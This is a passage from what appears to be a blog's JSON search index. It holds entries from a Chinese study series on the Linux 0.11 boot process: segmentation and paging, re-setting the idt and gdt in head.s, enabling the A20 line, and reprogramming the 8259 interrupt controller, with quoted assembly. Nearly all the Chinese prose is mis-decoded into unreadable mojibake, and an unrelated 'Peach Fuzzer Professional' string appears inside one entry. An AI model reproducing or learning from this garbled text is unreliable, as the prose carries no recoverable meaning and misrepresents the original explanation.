çš„çº¿æ€§åœ°å€ç©ºé—´ï¼Œä¸ 16M çš„ç‰©ç†åœ°å€ç©ºé—´ä¸€ä¸€å¯¹åº”èµ·æ¥äº†ã€‚ å¯¹äºä¸Šè¿°å†…å®¹å¯ä»¥æ•´ç†æ€»ç»“å¦‚ä¸‹ï¼š Intel ä½“ç³»ç»“æ„çš„å†…å­˜ç®¡ç†å¯ä»¥åˆ†æˆä¸¤å¤§éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯æ ‡é¢˜ä¸­çš„ä¸¤æ¿æ–§ï¼Œåˆ†æ®µå’Œåˆ†é¡µã€‚ åˆ†æ®µæœºåˆ¶åœ¨ä¹‹å‰å‡ å›å·²ç»è®¨è®ºè¿‡å¤šæ¬¡äº†ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†ä¸ºæ¯ä¸ªç¨‹åºæˆ–ä»»åŠ¡æä¾›å•ç‹¬çš„ä»£ç æ®µï¼ˆcsï¼‰ã€æ•°æ®æ®µï¼ˆdsï¼‰ã€æ ˆæ®µï¼ˆssï¼‰ï¼Œä½¿å…¶ä¸ä¼šç›¸äº’å¹²æ‰°ã€‚ åˆ†é¡µæœºåˆ¶æ˜¯æœ¬å›è®²çš„å†…å®¹ï¼Œå¼€æœºååˆ†é¡µæœºåˆ¶é»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å¼€å¯ï¼Œå¹¶ä¸”è®¾ç½®å¥½é¡µç›®å½•è¡¨ï¼ˆPDEï¼‰å’Œé¡µè¡¨ï¼ˆPTEï¼‰ã€‚å…¶ç›®çš„åœ¨äºå¯ä»¥æŒ‰éœ€ä½¿ç”¨ç‰©ç†å†…å­˜ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨å¤šä»»åŠ¡æ—¶èµ·åˆ°éš”ç¦»çš„ä½œç”¨ï¼Œè¿™ä¸ªåœ¨åé¢å°†å¤šä»»åŠ¡æ—¶å°†ä¼šæœ‰æ‰€ä½“ä¼šã€‚ åœ¨ Intel çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œåˆ†æ®µæœºåˆ¶æ˜¯æ²¡æœ‰å¼€å¯å’Œå…³é—­ä¸€è¯´çš„ï¼Œå®ƒå¿…é¡»å­˜åœ¨ï¼Œè€Œåˆ†é¡µæœºåˆ¶æ˜¯å¯ä»¥é€‰æ‹©å¼€å¯æˆ–å…³é—­çš„ã€‚æ‰€ä»¥å¦‚æœæœ‰äººå’Œä½ è¯´ï¼Œå®ƒå®ç°äº†ä¸€ä¸ªæ²¡æœ‰åˆ†æ®µæœºåˆ¶çš„æ“ä½œç³»ç»Ÿï¼Œé‚£ä¸€å®šæ˜¯ä¸ªå¤–è¡Œã€‚ å†è¯´è¯´é‚£äº›åœ°å€ï¼š é€»è¾‘åœ°å€ï¼šæˆ‘ä»¬ç¨‹åºå‘˜å†™ä»£ç æ—¶ç»™å‡ºçš„åœ°å€å«é€»è¾‘åœ°å€ï¼Œå…¶ä¸­åŒ…å«æ®µé€‰æ‹©å­å’Œåç§»åœ°å€ä¸¤éƒ¨åˆ†ã€‚ çº¿æ€§åœ°å€ï¼šé€šè¿‡åˆ†æ®µæœºåˆ¶ï¼Œå°†é€»è¾‘åœ°å€è½¬æ¢åçš„åœ°å€ï¼Œå«åšçº¿æ€§åœ°å€ã€‚è€Œè¿™ä¸ªçº¿æ€§åœ°å€æ˜¯æœ‰ä¸ªèŒƒå›´çš„ï¼Œè¿™ä¸ªèŒƒå›´å°±å«åšçº¿æ€§åœ°å€ç©ºé—´ï¼Œ32 ä½æ¨¡å¼ä¸‹ï¼Œçº¿æ€§åœ°å€ç©ºé—´å°±æ˜¯ 4Gã€‚ ç‰©ç†åœ°å€ï¼šå°±æ˜¯çœŸæ­£åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå®ƒä¹Ÿæ˜¯æœ‰èŒƒå›´çš„ï¼Œå«åšç‰©ç†åœ°å€ç©ºé—´ã€‚é‚£è¿™ä¸ªèŒƒå›´çš„å¤§å°ï¼Œå°±å–å†³äºä½ çš„å†…å­˜æœ‰å¤šå¤§äº†ã€‚ è™šæ‹Ÿåœ°å€ï¼šå¦‚æœæ²¡æœ‰å¼€å¯åˆ†é¡µæœºåˆ¶ï¼Œé‚£ä¹ˆçº¿æ€§åœ°å€å°±å’Œç‰©ç†åœ°å€æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå¯ä»¥ç†è§£ä¸ºç›¸ç­‰ã€‚å¦‚æœå¼€å¯äº†åˆ†é¡µæœºåˆ¶ï¼Œé‚£ä¹ˆçº¿æ€§åœ°å€å°†è¢«è§†ä¸ºè™šæ‹Ÿåœ°å€ï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€å°†ä¼šé€šè¿‡åˆ†é¡µæœºåˆ¶çš„è½¬æ¢ï¼Œæœ€ç»ˆè½¬æ¢æˆç‰©ç†åœ°å€ã€‚ ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:2","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"æ‰©å±•èµ„æ–™ å…³äºé€»è¾‘åœ°å€-çº¿æ€§åœ°å€-ç‰©ç†åœ°å€çš„è½¬æ¢ï¼Œå¯ä»¥å‚è€ƒ Intel æ‰‹å†Œï¼š Intel 3A Chapter 3 Protected-Mode Memory Management è€Œæœ‰å…³è¿™äº›åœ°å€çš„å®šä¹‰å’Œè¯´æ˜ï¼Œåœ¨æœ¬å°èŠ‚ä¸­ä¹Ÿåšäº†è¯¦ç»†çš„è¯´æ˜ï¼Œçœ‹è¿™é‡Œçš„ä»‹ç»æ˜¯æœ€æƒå¨ä¹Ÿæ˜¯æœ€é€å½»çš„ã€‚ç›¸ä¿¡æˆ‘ï¼Œå®ƒå¾ˆç®€å•ã€‚ é¡µç›®å½•è¡¨å’Œé¡µè¡¨çš„å…·ä½“ç»“æ„ï¼Œå¯ä»¥çœ‹ Intel 3A Chapter 4.3 32-bit paging ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:1:3","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬å…«å› Intelå†…å­˜ç®¡ç†ä¸¤æ¿æ–§ï¼šåˆ†æ®µä¸åˆ†é¡µ ","date":"2021-12-14","objectID":"/2021/12/linux-0.11-06/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-06","uri":"/2021/12/linux-0.11-06/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬äº”ç¯‡","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"Peach Fuzzer Professionalæœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬äº”ç¯‡ã€‚ ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"08 é‡æ–°è®¾ç½® idt å’Œ gdt ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼ŒCPU è¿›å…¥äº† 32 ä½ä¿æŠ¤æ¨¡å¼ï¼Œæˆ‘ä»¬å¿«é€Ÿå›é¡¾ä¸€ä¸‹å…³é”®çš„ä»£ç ã€‚ é¦–å…ˆé…ç½®äº†å…¨å±€æè¿°ç¬¦è¡¨ gdt å’Œä¸­æ–­æè¿°ç¬¦è¡¨ idtã€‚ lidt idt_48 lgdt gdt_48 ç„¶åæ‰“å¼€äº† A20 åœ°å€çº¿ã€‚ mov al,#0xD1 ; command write out #0x64,al mov al,#0xDF ; A20 on out #0x60,al ç„¶åæ›´æ”¹ cr0 å¯„å­˜å™¨å¼€å¯ä¿æŠ¤æ¨¡å¼ã€‚ mov ax,#0x0001 lmsw ax æœ€åï¼Œä¸€ä¸ªå¹²è„†åˆ©è½çš„è·³è½¬æŒ‡ä»¤ï¼Œè·³åˆ°äº†å†…å­˜åœ°å€ 0 å¤„å¼€å§‹æ‰§è¡Œä»£ç ã€‚ jmpi 0,8 0 ä½ç½®å¤„å­˜å‚¨ç€æ“ä½œç³»ç»Ÿå…¨éƒ¨æ ¸å¿ƒä»£ç ï¼Œæ˜¯ç”± head.s å’Œ main.c ä»¥åŠåé¢çš„æ— æ•°æºä»£ç æ–‡ä»¶ç¼–è¯‘å¹¶é“¾æ¥åœ¨ä¸€èµ·è€Œæˆçš„ system æ¨¡å—ã€‚ æ¥ä¸‹æ¥çœ‹ä¸‹åœ¨æ­£å¼è¿›å…¥ c è¯­è¨€å†™çš„ main.c ä¹‹å‰çš„ head.s ç©¶ç«Ÿå†™äº†ç‚¹å•¥ï¼Ÿ ; head.s _pg_dir: ; é¡µç›®å½•å­˜æ”¾åœ¨è¿™é‡Œ _startup_32: ; ä»¥ä¸‹5è¡Œè®¾ç½®å„ä¸ªæ•°æ®æ®µå¯„å­˜å™¨ï¼ŒæŒ‡å‘ gdt æ•°æ®æ®µæè¿°ç¬¦é¡¹ mov eax,0x10 mov ds,ax mov es,ax mov fs,ax mov gs,ax lss esp,_stack_start ; è¡¨ç¤º_stack_start -\u003e ss:espï¼Œè®¾ç½®ç³»ç»Ÿå †æ ˆã€‚ æ³¨æ„åˆ°å¼€å¤´æœ‰ä¸ªæ ‡å· _pg_dirï¼Œè¿™ä¸ªè¡¨ç¤ºé¡µç›®å½•ï¼Œä¹‹ååœ¨è®¾ç½®åˆ†é¡µæœºåˆ¶æ—¶ï¼Œé¡µç›®å½•ä¼šå­˜æ”¾åœ¨è¿™é‡Œï¼Œä¹Ÿä¼šè¦†ç›–è¿™é‡Œçš„ä»£ç ã€‚ å†å¾€ä¸‹è¿ç»­äº”ä¸ª mov æ“ä½œï¼Œåˆ†åˆ«ç»™ dsã€esã€fsã€gs è¿™å‡ ä¸ªæ®µå¯„å­˜å™¨èµ‹å€¼ä¸º 0x10ï¼Œæ ¹æ®æ®µæè¿°ç¬¦ç»“æ„è§£æï¼Œè¡¨ç¤ºè¿™å‡ ä¸ªæ®µå¯„å­˜å™¨çš„å€¼ä¸ºæŒ‡å‘å…¨å±€æè¿°ç¬¦è¡¨ä¸­çš„ç¬¬äºŒä¸ªæ®µæè¿°ç¬¦ï¼Œä¹Ÿå°±æ˜¯æ•°æ®æ®µæè¿°ç¬¦ã€‚ï¼ˆè¿™é‡Œæˆ‘ä»¬å¯èƒ½åœ¨åç»­è¿›è¡Œæºç é˜…è¯»çš„æ—¶å€™ä¼šè¿›ä¸€æ­¥æ·±å…¥ï¼Œè¿™é‡Œä½œè€…åˆ†æçš„æœ‰ç‚¹ç®€å•ï¼Œå¯èƒ½å¾ˆå¤šè¯»è€…çœ‹ä¸æ‡‚ã€‚ï¼‰ æœ€å lss æŒ‡ä»¤ç›¸å½“äºè®© ss:esp è¿™ä¸ªæ ˆé¡¶æŒ‡é’ˆæŒ‡å‘äº† _stack_start è¿™ä¸ªæ ‡å·çš„ä½ç½®ã€‚è¿˜è®°å¾—å›¾é‡Œçš„é‚£ä¸ªåŸæ¥çš„æ ˆé¡¶æŒ‡é’ˆåœ¨å“ªé‡Œå§ï¼Ÿå¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œ0x9FF00ï¼Œç°åœ¨è¦å˜å’¯ã€‚ è¿™ä¸ª stack_start æ ‡å·å®šä¹‰åœ¨äº†å¾ˆä¹…ä¹‹åæ‰ä¼šè®²åˆ°çš„ sched.c é‡Œï¼Œæˆ‘ä»¬è¿™é‡Œæ‹¿å‡ºæ¥åˆ†æä¸€æ³¢ã€‚ long user_stack[4096 \u003e\u003e 2]; struct { long *a; short b; } stack_start = {\u0026user_stack[4096 \u003e\u003e 2], 0x10}; é¦–å…ˆï¼Œstack_start ç»“æ„ä¸­çš„é«˜ä½ 8 å­—èŠ‚æ˜¯ 0x10ï¼Œå°†ä¼šèµ‹å€¼ç»™ ss æ ˆæ®µå¯„å­˜å™¨ï¼Œä½ä½ 16 å­—èŠ‚æ˜¯ user_stack è¿™ä¸ªæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„åœ°å€å€¼ï¼Œå°†å…¶èµ‹å€¼ç»™ esp å¯„å­˜å™¨ã€‚ èµ‹å€¼ç»™ ss çš„ 0x10 ä»ç„¶æŒ‰ç…§ä¿æŠ¤æ¨¡å¼ä¸‹çš„æ®µé€‰æ‹©å­å»è§£è¯»ï¼Œå…¶æŒ‡å‘çš„æ˜¯å…¨å±€æè¿°ç¬¦è¡¨ä¸­çš„ç¬¬äºŒä¸ªæ®µæè¿°ç¬¦ï¼ˆæ•°æ®æ®µæè¿°ç¬¦ï¼‰ï¼Œæ®µåŸºå€æ˜¯ 0ã€‚ èµ‹å€¼ç»™ esp å¯„å­˜å™¨çš„å°±æ˜¯ user_stack æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„å†…å­˜åœ°å€å€¼ï¼Œé‚£æœ€ç»ˆçš„æ ˆé¡¶åœ°å€ï¼Œä¹ŸæŒ‡å‘äº†è¿™é‡Œï¼ˆuser_stack + 0ï¼‰ï¼Œåé¢çš„å‹æ ˆæ“ä½œï¼Œå°±æ˜¯å¾€è¿™ä¸ªæ–°çš„æ ˆé¡¶åœ°å€å¤„å‹å’¯ã€‚ ç»§ç»­å¾€ä¸‹çœ‹ call setup_idt ;è®¾ç½®ä¸­æ–­æè¿°ç¬¦è¡¨ call setup_gdt ;è®¾ç½®å…¨å±€æè¿°ç¬¦è¡¨ mov eax,10h mov ds,ax mov es,ax mov fs,ax mov gs,ax lss esp,_stack_start å…ˆè®¾ç½®äº† idt å’Œ gdtï¼Œç„¶ååˆé‡æ–°æ‰§è¡Œäº†ä¸€éåˆšåˆšæ‰§è¡Œè¿‡çš„ä»£ç ã€‚ ä¸ºä»€ä¹ˆè¦é‡æ–°è®¾ç½®è¿™äº›æ®µå¯„å­˜å™¨å‘¢ï¼Ÿå› ä¸ºä¸Šé¢ä¿®æ”¹äº† gdtï¼Œæ‰€ä»¥è¦é‡æ–°è®¾ç½®ä¸€éä»¥åˆ·æ–°æ‰èƒ½ç”Ÿæ•ˆã€‚é‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±æŠŠç›®å…‰æ”¾åˆ°è®¾ç½® idt å’Œ gdt ä¸Šã€‚ä¸­æ–­æè¿°ç¬¦è¡¨ idt æˆ‘ä»¬ä¹‹å‰æ²¡è®¾ç½®è¿‡ï¼Œæ‰€ä»¥è¿™é‡Œè®¾ç½®å…·ä½“çš„å€¼ï¼Œç†æ‰€åº”å½“ã€‚ setup_idt: lea edx,ignore_int mov eax,00080000h mov ax,dx mov dx,8E00h lea edi,_idt mov ecx,256 rp_sidt: mov [edi],eax mov [edi+4],edx add edi,8 dec ecx jne rp_sidt lidt fword ptr idt_descr ret idt_descr: dw 256*8-1 dd _idt _idt: DQ 256 dup(0) ä¸ç”¨ç»†çœ‹ï¼Œæˆ‘ç»™ä½ è¯´æœ€ç»ˆæ•ˆæœã€‚ ä¸­æ–­æè¿°ç¬¦è¡¨ idt é‡Œé¢å­˜å‚¨ç€ä¸€ä¸ªä¸ªä¸­æ–­æè¿°ç¬¦ï¼Œæ¯ä¸€ä¸ªä¸­æ–­å·å°±å¯¹åº”ç€ä¸€ä¸ªä¸­æ–­æè¿°ç¬¦ï¼Œè€Œä¸­æ–­æè¿°ç¬¦é‡Œé¢å­˜å‚¨ç€ä¸»è¦æ˜¯ä¸­æ–­ç¨‹åºçš„åœ°å€ï¼Œè¿™æ ·ä¸€ä¸ªä¸­æ–­å·è¿‡æ¥åï¼ŒCPU å°±ä¼šè‡ªåŠ¨å¯»æ‰¾ç›¸åº”çš„ä¸­æ–­ç¨‹åºï¼Œç„¶åå»æ‰§è¡Œå®ƒã€‚ é‚£è¿™æ®µç¨‹åºçš„ä½œç”¨å°±æ˜¯ï¼Œè®¾ç½®äº† 256 ä¸ªä¸­æ–­æè¿°ç¬¦ï¼Œå¹¶ä¸”è®©æ¯ä¸€ä¸ªä¸­æ–­æè¿°ç¬¦ä¸­çš„ä¸­æ–­ç¨‹åºä¾‹ç¨‹éƒ½æŒ‡å‘ä¸€ä¸ª ignore_int çš„å‡½æ•°åœ°å€ï¼Œè¿™ä¸ªæ˜¯ä¸ªé»˜è®¤çš„ä¸­æ–­å¤„ç†ç¨‹åºï¼Œä¹‹åä¼šé€æ¸è¢«å„ä¸ªå…·ä½“çš„ä¸­æ–­ç¨‹åºæ‰€è¦†ç›–ã€‚æ¯”å¦‚ä¹‹åé”®ç›˜æ¨¡å—ä¼šå°†è‡ªå·±çš„é”®ç›˜ä¸­æ–­å¤„ç†ç¨‹åºï¼Œè¦†ç›–è¿‡å»ã€‚ é‚£ç°åœ¨ï¼Œäº§ç”Ÿä»»ä½•ä¸­æ–­éƒ½ä¼šæŒ‡å‘è¿™ä¸ªé»˜è®¤çš„å‡½æ•° ignore_intï¼Œä¹Ÿå°±æ˜¯è¯´ç°åœ¨è¿™ä¸ªé˜¶æ®µä½ æŒ‰é”®ç›˜è¿˜ä¸å¥½ä½¿ã€‚ è®¾ç½®ä¸­æ–­æè¿°ç¬¦è¡¨ setup_idt è¯´å®Œäº†ï¼Œé‚£æ¥ä¸‹æ¥ setup_gdt å°±åŒç†äº†ã€‚æˆ‘ä»¬å°±ç›´æ¥çœ‹è®¾ç½®å¥½åçš„æ–°çš„å…¨å±€æè¿°ç¬¦è¡¨é•¿ä»€ä¹ˆæ ·å§ï¼Ÿ _gdt: DQ 0000000000000000h ;/* NULL descriptor */ DQ 00c09a0000000fffh ;/* 16Mb */ DQ 00c0920000000fffh ;/* 16Mb */ DQ 0000000000000000h ;/* TEMPORARY - don't use */ DQ 252 dup(0) å…¶å®å’Œæˆ‘ä»¬åŸå…ˆè®¾ç½®å¥½çš„ gdt ä¸€æ¨¡ä¸€æ ·ã€‚ ä¹Ÿæ˜¯æœ‰ä»£ç æ®µæè¿°ç¬¦å’Œæ•°æ®æ®µæè¿°ç¬¦ï¼Œç„¶åç¬¬å››é¡¹ç³»ç»Ÿæ®µæè¿°ç¬¦å¹¶æ²¡æœ‰ç”¨åˆ°ï¼Œä¸ç”¨ç®¡ã€‚æœ€åè¿˜ç•™äº† 252 é¡¹çš„ç©ºé—´ï¼Œè¿™äº›ç©ºé—´åé¢ä¼šç”¨æ¥æ”¾ç½®ä»»åŠ¡çŠ¶æ€æ®µæè¿°ç¬¦ TSS å’Œå±€éƒ¨æè¿°ç¬¦ LDTï¼Œè¿™ä¸ªåé¢å†è¯´ã€‚ ä¸ºä»€ä¹ˆåŸæ¥å·²ç»è®¾ç½®è¿‡ä¸€éäº†ï¼Œè¿™é‡Œåˆè¦é‡æ–°è®¾ç½®ä¸€éï¼Œä½ å¯åƒä¸‡åˆ«æƒ³æœ‰ä»€ä¹ˆå¤æ‚çš„åŸå› ï¼Œå°±æ˜¯å› ä¸ºåŸæ¥è®¾ç½®çš„ gdt æ˜¯åœ¨ setup ç¨‹åºä¸­ï¼Œä¹‹åè¿™ä¸ªåœ°æ–¹è¦è¢«ç¼“å†²åŒºè¦†ç›–æ‰ï¼Œæ‰€ä»¥è¿™é‡Œé‡æ–°è®¾ç½®åœ¨ head ç¨‹åºä¸­ï¼Œè¿™å—å†…å­˜åŒºåŸŸä¹‹åå°±ä¸ä¼šè¢«å…¶ä»–ç¨‹åºç”¨åˆ°å¹¶ä¸”è¦†ç›–äº†ï¼Œå°±è¿™ä¹ˆä¸ªäº‹ã€‚ è¯´çš„å£å¹²èˆŒç‡¥ï¼Œè¿˜æ˜¯æ¥å¼ å›¾å§ã€‚ å¦‚æœä½ æœ¬æ–‡çš„å†…å®¹å®Œå…¨ä¸èƒ½ç†è§£ï¼Œé‚£å°±è®°ä½æœ€åè¿™å¼ å›¾å°±å¥½äº†ï¼Œæœ¬æ–‡ä»£ç å°±æ˜¯å®Œæˆäº†è¿™ä¸ªå›¾ä¸­æ‰€ç¤ºçš„ä¸€ä¸ªæŒ‡å‘è½¬æ¢è€Œå·²ï¼Œå¹¶ä¸”ç»™æ‰€æœ‰ä¸­æ–­è®¾ç½®äº†ä¸€ä¸ªé»˜è®¤çš„ä¸­æ–­å¤„ç†ç¨‹åº ignore_intï¼Œç„¶åå…¨å±€æè¿°ç¬¦è¡¨ä»ç„¶åªæœ‰ä»£ç æ®µæè¿°ç¬¦å’Œæ•°æ®æ®µæè¿°ç¬¦ã€‚ å¥½äº†ï¼Œæœ¬æ–‡å°±æ˜¯ä¸¤ä¸ªæè¿°ç¬¦è¡¨ä½ç½®çš„å˜åŒ–ä»¥åŠé‡æ–°è®¾ç½®ï¼Œå†åé¢ä¸€è¡Œä»£ç å°±æ˜¯åˆä¸€ä¸ªä»¤äººå…´å¥‹çš„åŠŸèƒ½äº†ï¼ jmp after_page_tables ... after_page_tables: push 0 push 0 push 0 push L6 push _main jmp setup_paging L6: jmp L6 é‚£å°±æ˜¯å¼€å¯åˆ†é¡µæœºåˆ¶ï¼Œå¹¶ä¸”è·³è½¬åˆ° main å‡½æ•°ï¼ è¿™å¯å¤ªä»¤äººå…´å¥‹äº†ï¼å¼€å¯åˆ†é¡µåï¼Œé…åˆç€ä¹‹å‰è®²çš„åˆ†æ®µï¼Œå°±æ„æˆäº†å†…å­˜ç®¡ç†çš„æœ€æœ€åº•å±‚çš„æœºåˆ¶ã€‚è€Œè·³è½¬åˆ° main å‡½æ•°ï¼Œæ ‡å¿—ç€æˆ‘ä»¬æ­£å¼è¿›å…¥ c è¯­è¨€å†™çš„æ“ä½œç³»ç»Ÿæ ¸å¿ƒä»£ç ï¼ ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"åŸæ–‡åœ°å€ ä½ ç®¡è¿™ç ´ç©æ„å«æ“ä½œç³»ç»Ÿæºç  | ç¬¬å…«å› çƒ¦æ­»äº†åˆè¦é‡æ–°è®¾ç½®ä¸€éidtå’Œgdt ","date":"2021-12-13","objectID":"/2021/12/linux-0.11-05/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-05","uri":"/2021/12/linux-0.11-05/"},{"categories":["LINUX"],"content":"é—ªå®¢Linuxæ“ä½œç³»ç»Ÿç³»åˆ—ç¬¬å››ç¯‡","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"Linux-0.11-04 æœ¬æ–‡æ˜¯Linux 0.11ç³»åˆ—å­¦ä¹ è®°å½•çš„æ­£å¼çš„ç¬¬å››ç¯‡ã€‚ ","date":"2021-12-12","objectID":"/2021/12/linux-0.11-04/:0:0","tags":["Linux","kernel"],"title":"Linux-0.11-04","uri":"/2021/12/linux-0.11-04/"},{"categories":["LINUX"],"content":"07 å…­è¡Œä»£ç å°±è¿›å…¥äº†ä¿æŠ¤æ¨¡å¼ ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼Œæ“ä½œç³»ç»Ÿè®¾ç½®äº†ä¸ªå…¨å±€æè¿°ç¬¦è¡¨ gdtã€‚ ä¸ºåé¢åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼åï¼Œèƒ½å»é‚£é‡Œå¯»æ‰¾åˆ°æ®µæè¿°ç¬¦ï¼Œç„¶åæ‹¼å‡‘æˆæœ€ç»ˆçš„ç‰©ç†åœ°å€ã€‚ è€Œæ­¤æ—¶æˆ‘ä»¬çš„å†…å­˜å¸ƒå±€å˜æˆäº†è¿™ä¸ªæ ·å­ã€‚ è¿™ä»…ä»…æ˜¯è¿›å…¥ä¿æŠ¤æ¨¡å¼å‰å‡†å¤‡å·¥ä½œçš„å…¶ä¸­ä¸€ä¸ªï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ã€‚ä»£ç ä»ç„¶æ˜¯ setup.s ä¸­çš„ã€‚ mov al,#0xD1 ; command write out #0x64,al mov al,#0xDF ; A20 on out #0x60,al è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼Œæ‰“å¼€ A20 åœ°å€çº¿ã€‚ä»€ä¹ˆæ˜¯ A20 åœ°å€çº¿å‘¢ï¼Ÿ ç®€å•ç†è§£ï¼Œè¿™ä¸€æ­¥å°±æ˜¯ä¸ºäº†çªç ´åœ°å€ä¿¡å·çº¿ 20 ä½çš„å®½åº¦ï¼Œå˜æˆ 32 ä½å¯ç”¨ã€‚è¿™æ˜¯ç”±äº 8086 CPU åªæœ‰ 20 ä½çš„åœ°å€çº¿ï¼Œæ‰€ä»¥å¦‚æœç¨‹åºç»™å‡º 21 ä½çš„å†…å­˜åœ°å€æ•°æ®ï¼Œé‚£å¤šå‡ºçš„ä¸€ä½å°±è¢«å¿½ç•¥äº†ï¼Œæ¯”å¦‚å¦‚æœç»è¿‡è®¡ç®—å¾—å‡ºä¸€ä¸ªå†…å­˜åœ°å€ä¸º 1 0000 00000000 00000000 ï¼Œé‚£å®é™…ä¸Šå†…å­˜åœ°å€ç›¸å½“äº 0ï¼Œå› ä¸ºé«˜ä½çš„é‚£ä¸ª 1 è¢«å¿½ç•¥äº†ï¼Œä½æ•°ä¸å¤Ÿã€‚ å½“ CPU åˆ°äº† 32 ä½æ—¶ä»£ä¹‹åï¼Œç”±äºè¦è€ƒè™‘å…¼å®¹æ€§ï¼Œè¿˜å¿…é¡»ä¿æŒä¸€ä¸ªåªèƒ½ç”¨ 20 ä½åœ°å€çº¿çš„æ¨¡å¼ï¼Œæ‰€ä»¥å¦‚æœä½ ä¸æ‰‹åŠ¨å¼€å¯çš„è¯ï¼Œå³ä½¿åœ°å€çº¿å·²ç»æœ‰ 32 ä½äº†ï¼Œä»ç„¶ä¼šé™åˆ¶åªèƒ½ä½¿ç”¨å…¶ä¸­çš„ 20 ä½ã€‚ æ¥ä¸‹æ¥çš„ä¸€æ®µä»£ç ï¼Œä½ å®Œå…¨å®Œå…¨ä¸ç”¨çœ‹ï¼Œä½†ä¸ºäº†é˜²æ­¢ä½ ä¸€ç›´è®°æŒ‚åœ¨å¿ƒä¸Šï¼Œæˆ‘ç»™ä½ æˆªå‡ºæ¥è¯´é“è¯´é“ï¼Œè¿™æ ·ä»¥åæˆ‘è¯´å®Œå…¨ä¸ç”¨çœ‹çš„ä»£ç æ—¶ï¼Œä½ å°±çœŸçš„å¯ä»¥æ”¾å®½å¿ƒå®Œå…¨ä¸çœ‹äº†ã€‚ å°±æ˜¯è¿™ä¸€å¤§å¨ï¼Œè¿˜æœ‰ Linus è‡ªå·±çš„æ³¨é‡Šã€‚ ; well, that went ok, I hope. Now we have to reprogram the interrupts :-( ; we put them right after the intel-reserved hardware interrupts, at ; int 0x20-0x2F. There they won't mess up anything. Sadly IBM really ; messed this up with the original PC, and they haven't been able to ; rectify it afterwards. Thus the bios puts interrupts at 0x08-0x0f, ; which is used for the internal hardware interrupts as well. We just ; have to reprogram the 8259's, and it isn't fun. mov al,#0x11 ; initialization sequence out #0x20,al ; send it to 8259A-1 .word 0x00eb,0x00eb ; jmp $+2, jmp $+2 out #0xA0,al ; and to 8259A-2 .word 0x00eb,0x00eb mov al,#0x20 ; start of hardware int's (0x20) out #0x21,al .word 0x00eb,0x00eb mov al,#0x28 ; start of hardware int's 2 (0x28) out #0xA1,al .word 0x00eb,0x00eb mov al,#0x04 ; 8259-1 is master out #0x21,al .word 0x00eb,0x00eb mov al,#0x02 ; 8259-2 is slave out #0xA1,al .word 0x00eb,0x00eb mov al,#0x01 ; 8086 mode for both out #0x21,al .word 0x00eb,0x00eb out #0xA1,al .word 0x00eb,0x00eb mov al,#0xFF ; mask off all interrupts for now out #0x21,al .word 0x00eb,0x00eb out #0xA1,al è¿™é‡Œæ˜¯å¯¹å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ 8259 èŠ¯ç‰‡è¿›è¡Œçš„ç¼–ç¨‹ã€‚ å› ä¸º ä¸­æ–­å·æ˜¯ä¸èƒ½å†²çªçš„ï¼Œ Intel æŠŠ 0 åˆ° 0x19 å·ä¸­æ–­éƒ½ä½œä¸ºä¿ç•™ä¸­æ–­ï¼Œæ¯”å¦‚ 0 å·ä¸­æ–­å°±è§„å®šä¸ºé™¤é›¶å¼‚å¸¸ï¼Œè½¯ä»¶è‡ªå®šä¹‰çš„ä¸­æ–­éƒ½åº”è¯¥æ”¾åœ¨è¿™ä¹‹åï¼Œä½†æ˜¯ IBM åœ¨åŸ PC æœºä¸­æç ¸äº†ï¼Œè·Ÿä¿ç•™ä¸­æ–­å·å‘ç”Ÿäº†å†²çªï¼Œä»¥åä¹Ÿæ²¡æœ‰çº æ­£è¿‡æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—é‡æ–°å¯¹å…¶è¿›è¡Œç¼–ç¨‹ï¼Œä¸å¾—ä¸åšï¼Œå´åˆä¸€ç‚¹æ„æ€ä¹Ÿæ²¡æœ‰ã€‚è¿™æ˜¯ Linus 